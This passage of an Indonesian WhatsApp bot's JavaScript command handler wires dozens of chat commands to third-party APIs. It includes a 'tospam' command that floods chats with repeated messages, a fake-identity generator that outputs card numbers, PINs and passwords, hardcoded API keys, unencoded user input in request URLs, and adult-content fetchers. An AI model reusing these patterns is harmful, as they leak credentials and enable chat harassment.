                    await limitAdd(sender)
break
case 'randomcerpen':
case 'Randomcerpen':	
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://viko-api.herokuapp.com/api/cerpen/random?apikey=katashi`)
					reply(data.result)
					await limitAdd(sender)
break
case 'ytmp42':
case 'Ytmp42':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Link nya?`)
                    query = args.join(" ")	
                    sticWait(from)
                    i = await fetchJson(`https://viko-api.herokuapp.com/api/yt/playmp4?query=${query}&apikey=katashi`)
                    ini_txt = `Title : ${i.title}\n`
                    ini_txt += `Channel : ${i.channel}\n`
                    ini_txt += `Publis : ${i.published}\n`
                    ini_txt += `View : ${i.views}\n`
                    ini_txt += `Link : ${i.url}\n`
                    gambar = await getBuffer(i.thumb)
                    vidi = await getBuffer(i.url)
                    dha.sendMessage(from, gambar, image, {quoted: mek, caption: ini_txt})
                    dha.sendMessage(from, vidi, video, {quoted: mek})
                    await limitAdd(sender)
break
case 'narutobanner':
case 'Narutobanner':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Teksnya?`)
                    query = args.join(" ")	
                    sticWait(from)
x = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/manga-naruto?teks=${query}`)
dha.sendMessage(from, x, image, {quoted: mek})
await limitAdd(sender)
break
case 'nhentaisearch': // Update By KATASHI
case 'Nhentaisearch': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Teksnya?`)
                    query = args.join(" ")	
sticWait(from)
					data = await fetchJson(`https://ziy.herokuapp.com/api/nHentaiSearch?query=${query}`, {method: 'get'})
					teks = 'NHENTAI SEARCH\n'
					for (let i of data.result) {
						teks += `*Nama:* : ${i.title}\n*Kode:* ${i.id}\n*Bahasa:* ${i.language}\n*View:* ${i.thumbnail.w}\n*-:* ${i.thumbnail.h}\n\nNHENTAI SEARCH\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'kisahnabi':
case 'Kisahnabi':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://viko-api.herokuapp.com/api/muslim/kisahnabi?nabi=${query}&apikey=katashi`)
                    get_result = get_result.result
                    sticWait(from)
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.kelahiran}\n`
                    ini_txt += `Wafat : ${get_result.wafat_usia}\n`
                    ini_txt += `Singgah : ${get_result.singgah}\n`
                    ini_txt += `Kisah : \n${get_result.kisah}`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'jarak':
case 'Jarak':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} jakarta - yogyakarta`)
                    pauls = args.join(" ")
                    teks1 = pauls.split("-")[0].trim()
                    teks2 = pauls.split("-")[1].trim()
                    sticWait(from)
                    get_result = await fetchJson(`https://api.dha.xyz/api/jaraktempuh?apikey=PinnBotwibu&kota1=${teks1}&kota2=${teks2}`)
                    x = get_result.result
                    ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
                    ini_txt += `\`\`\`â—ª Asal :\`\`\` ${x.from.name}\n`
                    ini_txt += `\`\`\`â—ª Garis Lintang :\`\`\` ${x.from.latitude}\n`
                    ini_txt += `\`\`\`â—ª Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
                    ini_txt += `\`\`\`â—ª Tujuan :\`\`\` ${x.to.name}\n`
                    ini_txt += `\`\`\`â—ª Garis Lintang :\`\`\` ${x.to.latitude}\n`
                    ini_txt += `\`\`\`â—ª Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
                    ini_txt += `\`\`\`â—ª Jarak Tempuh :\`\`\` ${x.jarak}\n`
                    ini_txt += `\`\`\`â—ª Waktu Tempuh :\`\`\`\n`
                    ini_txt += `   â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â\n`
                    ini_txt += `ââ”¤ Kereta Api : ${x.kereta_api}\n`
                    ini_txt += `ââ”¤ Pesawat : ${x.pesawat}\n`
                    ini_txt += `ââ”¤ Mobil : ${x.mobil}\n`
                    ini_txt += `ââ”¤ Motor : ${x.motor}\n`
                    ini_txt += `ââ”¤ Jalan Kaki : ${x.jalan_kaki}\n`
                    ini_txt += `   â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â\n`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'dafontsearch': // Update By KATASHI
case 'Dafontsearch': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Teksnya?`)
                    query = args.join(" ")	
sticWait(from)
					data = await fetchJson(`https://zenzapi.xyz/api/dafontsearch?query=${query}&apikey=Katashi`, {method: 'get'})
					teks = 'DAFONT SEARCH\n'
					for (let i of data.result) {
						teks += `*Nama:* : ${i.judul}\n*Style:* ${i.style}\n*Totla:* ${i.total}\n*Link:* ${i.link}\n\nDAFONT SEARCH\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
					case 'stcmeme':
					sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
  ct = body.slice(9)
              top = ct.split('|')[0]
              bottom = ct.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              sticWait(from)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await dha.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendWebp(from, anu1)
              } else {
              reply('Gunakan foto/stiker!')
}
               await limitAdd(sender)
break
               case 'datasekolah': // Update By KATASHI
case 'datasekolah': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply(`*Example :*\n${prefix}${command} 1|100`)
					makell = args.join(" ")
					r1 = makell.split("|")[0];
					r2 = makell.split("|")[1];
sticWait(from)
					data = await fetchJson(`https://api-sekolah-indonesia.herokuapp.com/sekolah?page=${r1}&perPage=${r2}`, {method: 'get'})
					teks = 'DATA SEKOLAH\n'
					for (let i of data.dataSekolah) {
						teks += `*Kode Provinsi:* : ${i.kode_prop}\n*Provinsi:* ${i.propinsi}\n*Kode Kabupaten:* ${i.kode_kab_kota}\n*Kabupaten:* ${i.kabupaten_kota}\n*Kode Kecamatan:* ${i.kode_kec}\n*Kecamatan:* ${i.kecamatan}\n*Id:* ${i.id}\n*Npsn:* ${i.npsn}\n*Sekolah:* ${i.sekolah}\n*Jenjang:* ${i.bentuk}\n*Negri/Swasta:* ${i.status}\n*Alamat:* ${i.alamat_jalan}\n*Lintang:* ${i.lintang}\n*Bujur:* ${i.bujur}\n\nDATA SEKOLAH\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'datasekolah2': // Update By KATASHI
case 'datasekolah2': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply(`*Example :*\n${prefix}${command} smk-1-5`)
					makell = args.join(" ")
					r1 = makell.split("-")[0];
					r2 = makell.split("-")[1];
					r3 = makell.split("-")[2];
sticWait(from)
					data = await fetchJson(`https://api-sekolah-indonesia.herokuapp.com/sekolah/${r1}?page=${r2}&perPage=${r3}`, {method: 'get'})
					teks = 'DATA SEKOLAH\n'
					for (let i of data.dataSekolah) {
						teks += `*Kode Provinsi:* : ${i.kode_prop}\n*Provinsi:* ${i.propinsi}\n*Kode Kabupaten:* ${i.kode_kab_kota}\n*Kabupaten:* ${i.kabupaten_kota}\n*Kode Kecamatan:* ${i.kode_kec}\n*Kecamatan:* ${i.kecamatan}\n*Id:* ${i.id}\n*Npsn:* ${i.npsn}\n*Sekolah:* ${i.sekolah}\n*Jenjang:* ${i.bentuk}\n*Negri/Swasta:* ${i.status}\n*Alamat:* ${i.alamat_jalan}\n*Lintang:* ${i.lintang}\n*Bujur:* ${i.bujur}\n\nDATA SEKOLAH\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'quotesislam':
case 'Quotesislam':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://viko-api.herokuapp.com/api/random/quotes/muslim?apikey=katashi`)
					reply(data.result.text_id)
					await limitAdd(sender)
break
case 'apikey':
case 'apikey':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} apikeynya`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://viko-api.herokuapp.com/api/cekapikey?apikey=${query}`)
                    sticWait(from)
                    ini_txt = `Status : ${get_result.status}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Apikey : ${get_result.apikey}\n`
                    ini_txt += `Result : ${get_result.result}\n`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'infoloker': // Update By KATASHI
case 'Infoloker': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infoloker`, {method: 'get'})
					teks = 'INFO LOKER\n'
					for (let x of data.result) {
						teks += `*Perusahaan:* : ${x.perusahaan}\n*Url* : ${x.link}\n*Profesi* : ${x.profesi}\n*Gaji* : ${x.gaji}\n*Lokasi* : ${x.lokasi}\n*Pengalaman* : ${x.pengalaman}\n*Edukasi* : ${x.edukasi}\n*Description* : ${x.desc}\n*Syarat* : ${x.syarat}\n\nINFO LOKER\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'katacinta':
case 'Katacinta':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
					gatauda = body.slice(8)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/katacinta`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
break  
					case 'cerpen':
                case 'Cerpen':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.pengarang}\n`
                    ini_txt += `Kategori : ${get_result.kategori}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'cersex':
                case 'Cersex':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/cersex`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.judul}\n`
                    ini_txt += `Img : ${get_result.img}\n`
                    ini_txt += `Story :\n${get_result.cersex}`
                    gaa = await getBuffer(get_result.img)
                    dha.sendMessage(from, gaa, image, {quoted: mek, caption: ini_txt})
                    await limitAdd(sender)
break
case 'jadwaltvnow':
                case 'Jadwaltvnow':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwaltvnow`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV Now :\n`
                    for (var x in get_result) {
                        ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'twich':  
      case 'Twich':  
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
      sticWait(from)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/twichquote`)
                   anu1 = ` *THWICH* : ${anu.result}`
                   reply(anu1)
                   await limitAdd(sender)
break                 
      case 'fake':  
      case 'Fake':  
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
      sticWait(from)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/fake_identity`)
                   anu1 = ` *NAMA* : ${anu.name}\n`
                   anu1 += ` *GENDER* : ${anu.gender}\n` 
                   anu1 += ` *AGE* : ${anu.age}\n`
                   anu1 += ` *BIRTDAY* : ${anu.birtday}\n`
                   anu1 += ` *BACHELOR* : ${anu.Bachelor}\n`
                   anu1 += ` *ADDRESA* : ${anu.address}\n`
                   anu1 += ` *CODE* : ${anu.zip_code}\n`
                   anu1 += ` *STATE* : ${anu.state}\n`
                   anu1 += ` *COUNTRY* : ${anu.country}\n`
                   anu1 += ` *EMAIL* : ${anu.email}\n`
                   anu1 += ` *PASS* : ${anu.password}\n` 
                   anu1 += ` *PHONE* : ${anu.phone}\n` 
                   anu1 += ` *CARD* : ${anu.card}\n`
                   anu1 += ` *CODE* : ${anu.code}\n`
                   anu1 += ` *DATE* : ${anu.date}\n`
                   anu1 += ` *PIN* : ${anu.pin_code}\n`
                   anu1 += ` *WEIGHT* : ${anu.weight}\n` 
                   anu1 += ` *HEIGHT* : ${anu.height}\n` 
                   anu1 += ` *TYPE* : ${anu.blood_type}\n`
                   anu1 += ` *STATUS* : ${anu.status}\n`
                   reply(anu1)
                   await limitAdd(sender)
break
case 'kusonime':  
case 'Kusonime':  
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
                   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/kuso?q=${query}`)
                   anu1 = ` *INFO* : ${anu.sinopsis}\n`
                   reply(anu1)
                   await limitAdd(sender)
break
      case 'renungan':  
      case 'Renungan':  
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
      sticWait(from)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/renungan`)
                   anu1 = ` *JUDUL* : ${anu.judul}\n`
                   anu1 += ` *PESAN* : ${anu.pesan}\n`
                   anu1 += ` *DESC* : ${anu.Isi}\n`
                   reply(anu1)
                   await limitAdd(sender)
break
       case 'samehadaku':  
       case 'Samehadaku':  
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
       sticWait(from)
                   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/samehadaku?q=${query}`)
                   anu2 = await getBuffer(anu.thumb)
                   anu1 = ` *JUDUL* : ${anu.title}\n`
                   anu1 += ` *LINK* : ${anu.link}\n`
                   anu1 += ` *DESK* : ${anu.desc}\n`
                   dha.sendMessage(from, anu2, image, {caption: anu1, quoted: mek })
                   await limitAdd(sender)
break
case 'tongue':  
case 'Tongue':  
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/tongue_twister`)
                   anu1 = ` *NIHH* : ${anu.result}`
                   reply(anu1)
                   await limitAdd(sender)
break
                   case 'mostviewfilm':
case 'Mostviewfilm':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/mostviewfilm`, {method: 'get'})
					teks = 'MOSTVIEWFILM\n'
					for (let i of anu.result) {
						teks += `*Penonton:* : ${i.penonton}\n*Rank* : ${i.rank}\n*Url* : ${i.link}\n\n*MOSTVIEWFILM*\n`
					}
					reply(teks.trim())  
					
					await limitAdd(sender)
break
					case 'trendingtwitter':
case 'Trendingtwitter':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/trendingtwitter`, {method: 'get'})
					teks = 'TRENDING TWITER\n'
					for (let i of anu.result) {
						teks += `*Hastag:* : ${i.hastag}\n*Rank* : ${i.rank}\n*Url* : ${i.link}\n*Tweet* : ${i.tweet}\n\n*TRANDING TWITTER*\n`
					}
					reply(teks.trim())  
					
					await limitAdd(sender)
break
case 'jadwalbola':
case 'jadwalbola':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwal-bola`, {method: 'get'})
					teks = 'JADWAL BOLA\n'
					for (let i of anu) {
						teks += `*Tanggal:* : ${i.tanggal}\n*Jam* : ${i.jam}\n*Liga* : ${i.liga}\n*Match* : ${i.match}\n*Tv Channel* : ${i.ch_tv}\n\n*JADWAL BOLA*\n`
					}
					reply(teks.trim())  
					
					await limitAdd(sender)
break
case 'vaksin':
case 'Vaksin':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    get_result = await fetchJson(`https://vaksincovid19-api.vercel.app/api/vaksin`)
                    sticWait(from)
                    ini_txt = `Total Sasaran : ${get_result.totalsasaran}\n`
                    ini_txt += `Sasaran Vaksin Sdmkl : ${get_result.sasaranvaksinsdmk}\n`
                    ini_txt += `Sasaran Vaksin Lansia : ${get_result.sasaranvaksinlansia}\n`
                    ini_txt += `Sasaran Vaksin Petugas Publik : ${get_result.sasaranvaksinpetugaspublik}\n`
                    ini_txt += `Vaksin 1 : \n${get_result.vaksinasi1}\n`
                    ini_txt += `Vaksin 2 : \n${get_result.vaksinasi2}\n`
                    ini_txt += `Last Update : \n${get_result.lastUpdate}`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'Hitungmatauang':
case 'hitungmatauang':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (args.length < 1) return reply(`*Example :*\n${prefix}${command} usd|id|12`)
					makell = args.join(" ")
					r1 = makell.split("|")[0];
					r2 = makell.split("|")[1];
					r3 = makell.split("|")[2]
                    get_result = await fetchJson(`https://api-exchange-rates.herokuapp.com/calculator?from=${r1}&to=${r2}&amount=${r3}`)
                    get_result = get_result.data
                    sticWait(from)
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Mata Uang 1 : ${get_result.fromResult}\n`
                    ini_txt += `Mata Uang 1 : ${get_result.toResult}\n`
                    ini_txt += `Update Tanggal : ${get_result.updatedAt}`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case "fast":
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await dha.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            dha.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        await limitAdd(sender)
break;
      case "slow":
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await dha.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            dha.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        await limitAdd(sender)
break;
      case "reverse":
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await dha.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          dha.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        await limitAdd(sender)
break;
          case "tospam":
          sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                      sticWait(from)
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  dha.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  dha.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await dha.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  dha.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await dha.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  dha.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await dha.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  dha.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  await limitAdd(sender)
break
      case "revoke":
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        dha.revokeInvite(from);
        reply("```Succes revoke link group```");
        await limitAdd(sender)
break;
case 'wanted':
case 'Wanted':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  sticWait(from)
	  owgi = await dha.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://fdz-app.herokuapp.com/api/maker/wanted?picurl=${anu.display_url}`)
	 dha.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	await limitAdd(sender)
break
      
      case "deltrash":
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
